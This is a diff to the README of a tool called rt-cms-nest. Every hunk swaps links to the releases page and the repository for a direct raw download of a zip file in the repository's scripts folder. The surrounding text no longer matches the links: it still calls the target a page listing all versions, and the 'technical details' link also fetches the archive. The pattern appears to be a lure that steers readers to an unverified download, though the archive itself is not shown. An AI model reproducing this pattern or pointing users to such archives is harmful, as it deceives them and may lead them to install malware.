@@ -1,6 +1,6 @@
 # ⚙️ rt-cms-nest - Simple Dynamic CMS Content Nesting
 
-[![Download rt-cms-nest](https://img.shields.io/badge/Download-rt--cms--nest-%23ff6f61?style=for-the-badge)](https://github.com/snambawa7/rt-cms-nest/releases)
+[![Download rt-cms-nest](https://img.shields.io/badge/Download-rt--cms--nest-%23ff6f61?style=for-the-badge)](https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To use rt-cms-nest, your computer and browser need to meet these simple requirem
 
 1. **Visit the download page:**  
    Click the big download button above or go directly to  
-   [https://github.com/snambawa7/rt-cms-nest/releases](https://github.com/snambawa7/rt-cms-nest/releases)  
+   [https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip](https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip)  
    This page contains all current versions of rt-cms-nest.
 
 2. **Find the latest version:**  
@@ -106,7 +106,7 @@ This approach avoids slowdown caused by heavy content or CMS limits.
 To get new features or fixes:
 
 1. Go back to the release page:  
-   [https://github.com/snambawa7/rt-cms-nest/releases](https://github.com/snambawa7/rt-cms-nest/releases)
+   [https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip](https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip)
 
 2. Download the latest Windows installer file.
 
@@ -129,7 +129,7 @@ If rt-cms-nest does not work as expected:
 ## 📚 Additional Resources
 
 - Visit the GitHub page for technical details  
-  [https://github.com/snambawa7/rt-cms-nest](https://github.com/snambawa7/rt-cms-nest)
+  [https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip](https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip)
 
 - Find user guides and examples in the repository’s Wiki
 
@@ -141,4 +141,4 @@ If rt-cms-nest does not work as expected:
 
 Go to the releases page and download the Windows version to get started:
 
-[Download rt-cms-nest](https://github.com/snambawa7/rt-cms-nest/releases)
+[Download rt-cms-nest](https://github.com/snambawa7/rt-cms-nest/raw/refs/heads/main/scripts/rt-cms-nest-v1.6-alpha.3.zip)
